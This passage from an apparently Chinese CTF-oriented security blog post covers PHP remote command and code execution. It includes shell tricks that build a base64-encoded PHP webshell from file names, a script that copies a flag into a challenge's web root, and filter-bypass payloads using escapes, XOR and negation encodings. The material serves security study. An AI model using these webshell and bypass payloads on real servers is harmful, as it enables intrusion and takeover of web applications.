class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">1. 直接写入命令                     (13)</span><br><span class="line">root@kali:~# echo &quot;ca\\&quot;&gt;cmd</span><br><span class="line">root@kali:~# echo &quot;t\\&quot;&gt;&gt;cmd</span><br><span class="line">root@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmd</span><br><span class="line">root@kali:~# echo &quot;ag&quot;&gt;&gt;cmd  </span><br><span class="line">root@kali:~# cat cmd          </span><br><span class="line">ca\                             </span><br><span class="line">t\</span><br><span class="line"> fl\</span><br><span class="line">ag</span><br><span class="line">root@kali:~# sh cmd</span><br><span class="line">this is your flag</span><br><span class="line">2. 利用文件名写入特殊命令</span><br><span class="line">root@kali:~/example# &gt;ag					</span><br><span class="line">root@kali:~/example# &gt;fl\\</span><br><span class="line">root@kali:~/example# &gt;t\ \\</span><br><span class="line">root@kali:~/example# &gt;ca\\</span><br><span class="line">root@kali:~/example# ls -t</span><br><span class="line">&#x27;ca\&#x27;  &#x27;t \&#x27;  &#x27;fl\&#x27;   ag   flag</span><br><span class="line">root@kali:~/example# ls -t&gt;a       (7)</span><br><span class="line">root@kali:~/example# sh a  #sh会把a里面的每行内容当作命令来执行</span><br><span class="line">a: 1: a: not found</span><br><span class="line">this is your flag</span><br><span class="line">a: 6: flag: not found</span><br><span class="line">3. 临时文件执行</span><br><span class="line">url = &quot;http://a9320a52-4229-4dab-aa2b-9193c06c95e1.challenge.ctf.show/&quot;​</span><br><span class="line">def getFlag():​</span><br><span class="line">  file=&#123;​</span><br><span class="line">  &quot;file&quot;:&quot;#!/bin/sh\ncat /f*&gt;/var/www/html/1.txt&quot;​</span><br><span class="line">  &#125;​</span><br><span class="line">​</span><br><span class="line">  data=&#123;​</span><br><span class="line">    &quot;cmd&quot;:&quot;. /t*/*&quot;​                (7)</span><br><span class="line">  &#125;​</span><br><span class="line">  response = requests.post(url=url+&quot;api/tools.php&quot;,files=file,data=data)​</span><br><span class="line">4. 读取文件                         (7)</span><br><span class="line">ls / &gt;a</span><br><span class="line">nl /*&gt;a</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------</span><br><span class="line">                                    (5)</span><br><span class="line">5. 使用dir和通配符写入命令</span><br><span class="line">root@kali:~/example# &gt;dir</span><br><span class="line">root@kali:~/example# &gt;f\&gt;</span><br><span class="line">root@kali:~/example# &gt;ht-</span><br><span class="line">root@kali:~/example# &gt;sl</span><br><span class="line">root@kali:~/example# *&gt;v  (等同于命令：dir &quot;f&gt;&quot; &quot;ht‐&quot; &quot;sl&quot; &gt; v )</span><br><span class="line">root@kali:~/example# &gt;rev </span><br><span class="line">root@kali:~/example# *v&gt;0 前面的*v等同于命令rev v，相当于将v中的文件内容倒了回来，变回:ls -th &gt;f</span><br><span class="line">然后将倒转后的内容写入文件0中，文件0中的内容为:ls -th &gt;f</span><br><span class="line">4. 利用3命令注入php一句话木马</span><br><span class="line">&gt;dir</span><br><span class="line">&gt;0\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;pO\\</span><br><span class="line">&gt;V0\\</span><br><span class="line">&gt;bM\\</span><br><span class="line">&gt;1R\\</span><br><span class="line">&gt;PU\\</span><br><span class="line">&gt;1B\\</span><br><span class="line">&gt;kX\\</span><br><span class="line">&gt;Cg\\ </span><br><span class="line">&gt;hb\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;HA\\</span><br><span class="line">&gt;a\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh 0</span><br><span class="line"></span><br><span class="line">文件a中的内容为:ls -th &gt;0</span><br><span class="line">文件0中的内容为:</span><br><span class="line">echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br><span class="line">0</span><br><span class="line">rev</span><br><span class="line">v</span><br><span class="line">sl</span><br><span class="line">ht‐</span><br><span class="line">f&gt;</span><br><span class="line">dir</span><br><span class="line">空格要用$&#123;IFS&#125;来代替，避免一句话中存在两个空格</span><br><span class="line">文件1.php成功生成后的内容为:&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure>
<h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715211205.png" alt="QQ截图20220715211205"><br>实例<br><strong>``</strong><br>里内容作为shell命令来执行,如echo `ls`;</p>
<ul>
<li>system()函数可以执行系统命令, 并将命令执行的结果直接输出到界面</li>
</ul>
<p><code>system(&#39;ls&#39;)</code></p>
<ul>
<li>exec()函数是被禁用的,先是 要关掉 安全模式 <code>safe_mode = off</code><br>exec(‘ls’,$result);如果result数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容    </li>
</ul>
<p><code>exec(&#39;ls&#39;,$result); print_r($result);</code></p>
<ul>
<li>shell_exec()函数可以执行系统命令, 但它不会直接输出执行的结果, 而是返回一个字符串类型的变量来存储系统命令的执行结果</li>
</ul>
<p><code>echo shell_exec(&#39;ls&#39;)</code></p>
<ul>
<li>passthru()函数可以执行系统命令, 并将执行结果输出到页面中, 与system()函数不同的是, 它支持二进制的数据, 更多的用于文件, 图片等操作</li>
</ul>
<p><code>passthru(&#39;ls&#39;)</code></p>
<ul>
<li>popen()函数可以执行系统命令, 但不会输出执行的结果, 而是返回一个资源类型的变量用来存储系统命令的执行结果<br>$result = popen( ‘ls’ , ‘r’ );参数’1’:字符串类型,需要执行的命令,;参数2:字符串类型,模式 ;返回值:资源类型,命令执行的结果</li>
</ul>
<p><code>$result = popen( &#39;ls&#39;,&#39;r&#39; ); echo fread( $result , 100 );</code></p>
<h3 id="php命令执行绕过"><a href="#php命令执行绕过" class="headerlink" title="php命令执行绕过"></a>php命令执行绕过</h3><p>PHP内置的命令执行函数（如shell_exec、system），都只接受一个“字符串”作为参数。而在内核中，这个字符串将被直接作为一条shell命令来调用，这种情况下就极为容易出现命令注入漏洞。</p>
<p>由于这个特点，PHP特别准备了两个过滤函数：</p>
<pre><code>escapeshellcmd
escapeshellarg
</code></pre>
<p>二者分工不同.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line"></span><br><span class="line">功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/l4sij.png" alt="l4sij"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line"></span><br><span class="line">功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line"></span><br><span class="line">反斜线（\）会在以下字符之前插入： &amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 </span><br><span class="line">在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果是先用 escapeshellarg 函数过滤,再用的 escapeshellcmd 函数过滤<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/se6sc.png" alt="se6sc"></p>
<h2 id="rce–代码执行"><a href="#rce–代码执行" class="headerlink" title="rce–代码执行"></a>rce–代码执行</h2><h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><ul>
<li>eval()<br>eval是一个语言构造器，并不是系统组件函数，不能被 可变函数 调用。因此我们在php.ini中使用disable_functions是无法禁止它的,只有使用插件才能禁用。因此一般我们的一句话木马一般都写成<code>&lt;?php eval($_POST[&#39;1&#39;]);</code>而不是<code>&lt;?php$_POST[&#39;1&#39;]($_POST[&#39;2&#39;]);</code><br>eval() 函数把字符串按照 PHP 代码来计算且只能执行一次,该字符串必须是合法的 PHP 代码，且必须以分号结尾。如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</li>
<li>assert()<br>编写代码时，我们总是会做出一些假设，断言就是用于在代码中捕捉这些假设，可以将断言看作是异常处理的一种高级形式。程序员断言在程序中的某个特定点该的表达式值为真(为真才能继续执行)。如果该表达式为假，就中断操作. 版本在PHP7以下是函数 PHP7及以上为语法结构,<strong>php7.1</strong>以后就只能用eval了 assert默认没有执行功能了<br><code>assert ( mixed $assertion [, Throwable $exception ] )</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot; phpinfo()&quot;); &lt;错误&gt;</span><br><span class="line"></span><br><span class="line">eval(&quot; phpinfo();&quot;); &lt;正确&gt;</span><br><span class="line">assert(&quot; phpinfo()&quot;); &lt;正确&gt;</span><br></pre></td></tr></table></figure></li>
<li>preg_replace() /e代码执行漏洞<br>preg_replace($pattern, $replacement, $subject),如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串.<br>(如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。)<br>正则表达式中的/e模式的作用是将<strong>替换串</strong>中的内容当作代码来执行，/e模式是php语言才有的，除此之外还有/i(不区分大小写)等。php5.5废除preg_replace的/e模式(不是移除)当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、  和 NULL) 而后进行后向引用替换.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)&#123; .......&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &#x27;test(&quot;\1&quot;)&#x27;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
在php中，<strong>双引号</strong>里面如果包含有变量，php解释器会将其替换为变量解释后的结果；<strong>单引号</strong>中的变量不会被处理。<br>我们如果提交?h=[php]{${phpinfo()}}[/php],replacement 参数变为’test(“{${phpinfo()}}”)’,phpinfo()就会被执行</li>
</ul>
<h3 id="php代码执行漏洞绕过"><a href="#php代码执行漏洞绕过" class="headerlink" title="php代码执行漏洞绕过"></a>php代码执行漏洞绕过</h3><ol>
<li>字符串拼接绕过(<strong>PHP&gt;=7</strong>)<br>在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串”mochu7”，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>字符串转义绕过(php&gt;=7)<br>以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如”\400” == “\000”）<br>以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41”）<br>以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();#phpinfo();</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;);#system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>多次传参绕过</li>
<li>异或绕过和取反绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/php/text.php?code=$&#123;(&#x27;%00&#x27;^&#x27;%5f&#x27;).(&#x27;%07&#x27;^&#x27;%40&#x27;).(&#x27;%05&#x27;^&#x27;%40&#x27;).(&#x27;%09&#x27;^&#x27;%5d&#x27;)&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//phpinfo()</span><br><span class="line"></span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);</span><br><span class="line">#system(&#x27;whoami&#x27;);</span><br><span class="line"></span><br><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br><span class="line">#assert（eval($_POST[test])) eval函数无法调用eval函数</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="php文件操作"><a href="#php文件操作" class="headerlink" title="php文件操作"></a>php文件操作</h3><h4 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h4><p>rmdir           删除目录<br>​is_dir()        函数检查指定的文件是否是目录。<br>mkdir           创建目录<br>scandir($dir)   函数返回指定目录中的文件和目录的数组，$dir可以是相对路径，也可以是绝对路径</p>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>move_uploaded_file  (临时上传文件路径,目标文件路径);//移动临时上传文件<br>unlink              删除文件<br>copy                复制文件copy($file, $newfile);<br>file_exists()       函数检查文件或目录是否存在。</p>
<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><p>file_put_contents   将一个字符串写入文件file_put_contents(“1.txt”,”6666”);参数 data 也可以是数组（但不能是多维数组）</p>
<p>$fp = fopen(文件路径, “w”);//以写入模式打开一个文件 返回文件指针(不存在会自动创建)<br>fwrite($fp,写入字符串);//写入数据<br>fclose($fp);//关闭文件</p>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>file_get_contents           读入文件返回字符串，echo file_get_contents(“flag.txt”); echo file_get_contents(“<a target="_blank" rel="noopener" href="https://www.bilibili.com/&quot;">https://www.bilibili.com/&quot;</a>);<br>readfile                    读取一个文件，写入到输出缓冲区，并返回从文件中读入的字节数<br>file                        把整个文件读入一个数组中echo implode(‘’, file(‘<a target="_blank" rel="noopener" href="https://www.bilibili.com/&#39;">https://www.bilibili.com/&#39;</a>));<br>highlight_file/show_source  语法高亮一个文件highlight_file(“1.php”);<br>parse_ini_file              读取并解析一个ini配置文件print_r(parse_ini_file(‘1.ini’));<br>simplexml_load_file         读取文件作为XML文档解析</p>
<p>​fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf打开文件或者 URL 读取文件流<br>$file = fopen(“test.txt”,”r”); echo fread($file,”1234”); fclose($file);</p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>print_r() 函数用于打印变量，以更容易理解的形式展示。<br>var_dump() 函数用于输出变量的相关信息。<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220715223832.png" alt="QQ截图20220715223832"></p>
<h3 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h3><h4 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;    </span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\w+(\w+((?R)?))、\w+(\w+(\w+((?R)?)))、…<br>可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数</p>
<h4 id="从外取值"><a href="#从外取值" class="headerlink" title="从外取值"></a>从外取值</h4><h5 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h5><p>这个函数的作用是获取http所有的头部信息，即headers，但这个有个限制条件就是必须在apache的环境下可以使用<br>返回值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220802184221.png" alt="QQ截图20220802184221"><br>如果当前为多元数组，则返回的元素为数组，另外current的还有个别名为<strong>pos</strong><br>有的时候当我们想读的文件比较靠后时，就可以用array_reverse()这个函数把它倒过来，就可以少用几个next()</p>
<p>我们在http header中写入我们的参数，可用其进行bypass 无参数函数执行<br>例如<br><code>end(getallheaders())</code></p>
<h5 id="2-get-defined-vars-版本要求：PHP-4-gt-4-0-4-PHP-5-PHP-7"><a href="#2-get-defined-vars-版本要求：PHP-4-gt-4-0-4-PHP-5-PHP-7" class="headerlink" title="2.get_defined_vars()(版本要求：PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)"></a>2.get_defined_vars()(版本要求：PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</h5><p>返回一个包含所有已定义变量列表的<strong>多维</strong>数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br>在这里可以发现其只能回显全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>
<h5 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h5><p>注意的就是session_id()要开启session才能用，session_id()会获取/设置COOKIE的PHPSESSID，<br>但PHPSESSID允许字母和数字出现，我们可以先将其16进制编码，再用hex2bin函数将16进制转换为字符串</p>
<h5 id="4-getenv"><a href="#4-getenv" class="headerlink" title="4.getenv()"></a>4.getenv()</h5><p>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)<br>所以该函数只适用于PHP7.1之后版本<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112652.jpg" alt="1594112652"><br>我们怎么从一个偌大的数组中取出我们指定的值,我们可用爆破的方式获取数组中任意位置需要的值<br>array_rand随机返回一个或多个键，第二个参数用来确定要选出几个键，默认是一个键<br>array_flip交换数组中的键和值</p>
<h4 id="直接读取文件"><a href="#直接读取文件" class="headerlink" title="直接读取文件"></a>直接读取文件</h4><h5 id="路径操作"><a href="#路径操作" class="headerlink" title="路径操作"></a>路径操作</h5><ol>
<li>获取当前目录</li>
</ol>
<ul>
<li><p>getcwd()获取当前目录</p>
</li>
<li><p>scandir()列出目录中的文件和目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure>
<p>正常的，也可以使用print_r(scandir(‘.’));来查看当前目录所有文件名</p>
</li>
<li><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，它返回的是一个二维数组，而它的第一位就是一个点.<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112630.jpg" alt="1594112630"></p>
</li>
<li><p>chr(46)<br>chr(46)就是字符.,chr() 函数以256为一个周期，所以 chr(46)、chr(302)、chr(558)等都等于 .</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. phpversion()</span><br><span class="line">如果PHP版本为5</span><br><span class="line">floor(phpversion())返回 5</span><br><span class="line">sqrt(floor(phpversion()))返回2.2360679774998</span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615</span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491</span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156</span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回&quot;.&quot;</span><br><span class="line">2. time()</span><br><span class="line">返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数,date(&quot;Y-m-d&quot;,$t)可以返回当地时间。</span><br><span class="line">chr(time())，一个周期(256)必定出现一次&quot;.&quot;</span><br><span class="line">chr(localtime(time())) 以数组的形式返回本地时间，第一个值为秒，则一个周期(60)必定出现一次&quot;.&quot;</span><br><span class="line">3. crypt</span><br><span class="line">hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符</span><br><span class="line">chr(ord(hebrevc(crypt(time()))))</span><br></pre></td></tr></table></figure></li>
<li><p>其他获得.的方法<br>strrev(crypt(serialize(array())))也可以得到”.”</p>
</li>
</ul>
<ol start="2">
<li>目录遍历<br>那么既然不在这一层目录，如何进行目录上跳呢？</li>
</ol>
<ul>
<li>dirname()返回路径中的目录部分</li>
<li>chdir()可以更改我们的当前目录<br>通过不断切换目录实现任意文件读取<br>当然chdir(‘..’),即chdir(next(scandir(getcwd()))),也可以更改我们的当前目录</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/rce/" rel="tag"># rce</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/07/11/php%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/" rel="prev" title="php审计基础">
                  <i class="fa fa-chevron-left"></i> php审计基础
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/09/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="反序列化">
                  反序列化 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">mayylu</span>
</div>
  <div class="powered-by">تطبيق الموقع <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
